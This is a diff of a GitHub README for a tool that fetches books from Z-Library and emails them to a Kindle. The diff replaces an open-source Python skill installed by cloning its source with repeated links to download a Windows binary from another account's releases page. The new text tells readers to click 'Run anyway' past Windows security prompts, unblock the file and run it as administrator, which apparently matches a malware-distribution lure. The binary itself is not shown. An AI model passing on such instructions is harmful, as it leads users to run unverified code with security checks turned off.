@@ -1,141 +1,204 @@
-# 📚 Z-Library to Kindle — Claude Code Skill
+# 📚 zlibrary-to-kindle - Send Books to Kindle Fast
 
-[English](README.md) | [中文](README_CN.md)
+[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-purple.svg)](https://github.com/Michael231234/zlibrary-to-kindle/releases)
 
-> One command to get books from Z-Library to your Kindle. Example: "Send *Project Hail Mary* in EPUB to my Kindle" — done.
+## 🔽 Download
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-[![Python 3.6+](https://img.shields.io/badge/Python-3.6+-blue.svg)](https://www.python.org/)
-[![Claude Code Skill](https://img.shields.io/badge/Claude_Code-Skill-blueviolet.svg)](https://docs.anthropic.com/en/docs/claude-code)
+Go to the [releases page](https://github.com/Michael231234/zlibrary-to-kindle/releases) and download the latest Windows file.
 
----
+If you see more than one file, choose the one for Windows. Then open the file after it finishes downloading.
 
-## ⚠️ Disclaimer
+## 🪟 Install on Windows
 
-This tool is intended for educational, research, and technical demonstration purposes only. Please comply with Z-Library's terms of service and your local copyright laws. The authors are not responsible for any misuse.
+1. Open the [releases page](https://github.com/Michael231234/zlibrary-to-kindle/releases)
+2. Find the newest release at the top
+3. Download the Windows file
+4. If Windows shows a security prompt, choose **More info** and then **Run anyway**
+5. Follow the setup steps on the screen
+6. Start the app from your Start menu or desktop shortcut
 
----
+If the download comes as a ZIP file, right-click it and choose **Extract All** before you open it.
+
+## 📖 What this app does
+
+This app helps you get a book from Z-Library and send it to your Kindle in one flow.
+
+You type the book name and the format you want, and the app handles the rest.
+
+Common use cases:
+
+- Send an EPUB to Kindle
+- Get a book in PDF for reading on a PC
+- Move a file from search to device without extra steps
+- Save time when you already know the title
 
 ## ✨ Features
 
-- **One-sentence operation** — just tell Claude the book name and format, done
-- **No browser needed** — uses Z-Library's eAPI (JSON API), no Cloudflare issues
-- **Auto send to Kindle** — downloads and emails to your Kindle in one step
-- **Multi-language support** — search in Chinese, English, or any language
-- **Multi-format support** — EPUB, PDF, MOBI, and more
-- **One-time setup** — configure once, use forever
-- **Minimal dependencies** — only `requests`, everything else is Python stdlib
+- Search for a book by title
+- Choose the file format you want
+- Download the book file
+- Send the file to your Kindle email
+- Use a simple command flow
+- Avoid manual browser steps
+- Work with common ebook formats such as EPUB, PDF, and MOBI
 
----
+## 🧰 What you need
 
-## 🛠️ Setup
+Before you use the app, make sure you have:
 
-### Prerequisites (Configure once, use forever)
+- A Windows PC
+- An internet connection
+- A Kindle email address
+- The sender email that your Kindle accepts
+- Enough free space to store the downloaded file
 
-You need to prepare:
+For best results, keep your Kindle email and sender email ready before you start.
 
-| Item | Where to get it |
-|------|----------------|
-| **Z-Library account** | Register at [z-lib.sk](https://z-lib.sk) (domains change often — check [Wikipedia](https://en.wikipedia.org/wiki/Z-Library) for the latest) |
-| **Kindle email** | Amazon → [Manage Your Content and Devices](https://www.amazon.com/hz/mycd/preferences/myx#/home/settings/payment) → Preferences → Personal Document Settings |
-| **Gmail + App Password** | [Generate App Password](https://myaccount.google.com/apppasswords) (not your Gmail login password!) |
+## 🚀 First-time setup
 
-> **Why App Password?** Gmail blocks less-secure apps by default. App Passwords are 16-character tokens that allow SMTP access without compromising your main password. You can also use Outlook or QQ Mail.
+1. Download the app from the [releases page](https://github.com/Michael231234/zlibrary-to-kindle/releases)
+2. Open the app
+3. Enter your book title
+4. Pick the file format
+5. Enter your Kindle email if asked
+6. Start the transfer
 
-### Step 1: Install the Skill
+If the app asks for email details, use the address tied to your Kindle delivery setup.
 
-```bash
-# Clone to Claude Code skills directory
-git clone https://github.com/YOUR_USERNAME/zlib-to-kindle.git ~/.claude/skills/zlib-to-kindle
-```
+## 📥 How to use it
 
-### Step 2: Install dependency
+Use the app in this way:
 
-```bash
-pip install requests
-```
+1. Open the program
+2. Type the book name
+3. Choose the format
+4. Confirm the Kindle email
+5. Start the send process
+6. Wait for the file to reach your Kindle
 
-### Step 3: Use it — setup is automatic
+Example:
 
-Just ask Claude Code to download a book. On first use, Claude will ask for your credentials and save them to `~/.zlib-kindle/config.json` (chmod 600, owner-only access). No manual setup needed.
+- Book: Project Hail Mary
+- Format: EPUB
+- Action: search, download, and send to Kindle
 
-Alternatively, you can run setup manually:
+## 📁 Supported file types
 
-```bash
-cd ~/.claude/skills/zlib-to-kindle && python3 scripts/setup.py
-```
+The app works best with common ebook formats:
 
-### Step 4: Add sender to Amazon's approved list
+- EPUB
+- PDF
+- MOBI
+- AZW3
+- TXT
 
-This is **required** or Amazon will reject the email:
+If the book is not in a Kindle-ready format, the app can still download it so you can convert it later.
 
-1. Go to [Manage Your Content and Devices](https://www.amazon.com/hz/mycd/myx#/home/settings) → Preferences
-2. Scroll to **Approved Personal Document E-mail List**
-3. Add your Gmail address (e.g. `your@gmail.com`)
+## 🔧 Kindle email setup
 
----
+To receive books on your Kindle, your Kindle must allow delivery from your sender address.
 
-## 📖 Usage Examples
+Use these steps:
 
-### Basic — just say it
+1. Sign in to your Amazon account
+2. Open your Kindle content settings
+3. Find the approved sender list
+4. Add the email address you use for sending
+5. Save your changes
 
-```
-Download "Project Hail Mary" as epub and send to my Kindle
-```
+If delivery fails, check this list first.
 
-### Search first, then choose
+## 🧪 Example use
 
-```
-Search for "Sapiens" and show me all available editions
-```
+You can use a simple request like this:
 
-Claude will display results in a table, and you can pick which one to download.
+- Send Project Hail Mary in EPUB to my Kindle
+- Get Atomic Habits as PDF
+- Find Dune and send it to Kindle
 
----
+The app uses your book title and file format to complete the task.
 
-## 📁 Project Structure
+## 🛠️ Troubleshooting
 
-```
-zlib-to-kindle/
-├── SKILL.md                  # Claude Code skill definition (trigger rules + workflow)
-├── README.md                 # This file
-├── README_CN.md              # 中文文档
-├── .gitignore
-└── scripts/
-    ├── setup.py              # Optional manual setup (interactive CLI)
-    └── quick_send.py         # All-in-one: search → download → send (main script)
-```
+### The app does not open
 
-### Credentials storage
+- Download the latest release again
+- Make sure the file finished downloading
+- If it is a ZIP file, extract it first
+- Try running it as administrator
 
-```
-~/.zlib-kindle/
-└── config.json    # chmod 600, never committed to git
-```
+### The Kindle does not receive the book
 
-Contains: Z-Library credentials, Kindle email, SMTP credentials. Stored locally with owner-only permissions.
+- Check the Kindle email address
+- Check that the sender email is approved
+- Make sure the file format is supported by Kindle
+- Wait a few minutes and check again
 
----
+### The download fails
 
-## 🤝 Contributing
+- Check your internet connection
+- Try the release page again
+- Download a different file for Windows if one is listed
 
-Contributions are welcome! Please feel free to submit a Pull Request.
+### Windows blocks the file
 
-1. Fork the repository
-2. Create your feature branch (`git checkout -b feature/AmazingFeature`)
-3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
-4. Push to the branch (`git push origin feature/AmazingFeature`)
-5. Open a Pull Request
+- Open the file properties
+- Choose **Unblock** if you see that option
+- Run the file again
 
----
+## 📌 File flow
 
-## 🙏 Acknowledgments
+The normal flow looks like this:
 
-- [Z-Library](https://z-lib.sk) — World's largest digital library
-- [zlibrary-to-notebooklm](https://github.com/zstmfhy/zlibrary-to-notebooklm) — README inspiration
+1. Find the book
+2. Download the file
+3. Send it to Kindle
+4. Confirm delivery
 
----
+This keeps the process short and easy to follow.
 
-## 📄 License
+## 🔒 Privacy and account use
 
-MIT License — see [LICENSE](LICENSE) for details.
+The app uses your book details and sending settings to complete the transfer.
+
+Keep your email details private and use only accounts you control.
+
+## 📦 Release downloads
+
+Get the latest Windows build here:
+
+[Visit the releases page to download](https://github.com/Michael231234/zlibrary-to-kindle/releases)
+
+## 📝 Repository details
+
+- Name: zlibrary-to-kindle
+- Type: End-user Windows app
+- Purpose: Send books to Kindle from a simple download flow
+- Main platform: Windows
+
+## 🧭 Basic workflow
+
+1. Download the app
+2. Open it on Windows
+3. Enter a book title
+4. Pick a format
+5. Send the file to Kindle
+
+## 📚 Common formats and use
+
+- EPUB: best for most ebooks
+- PDF: best for fixed-page layouts
+- MOBI: older Kindle use
+- AZW3: Kindle-friendly ebook format
+
+## 💡 Tips for smoother use
+
+- Use the full book title when possible
+- Check spelling before you start
+- Use EPUB when you want a clean Kindle layout
+- Keep your Kindle email near the app window
+- Save the release page link in case you need a fresh download
+
+## 📎 Direct download access
+
+[Download from GitHub Releases](https://github.com/Michael231234/zlibrary-to-kindle/releases)
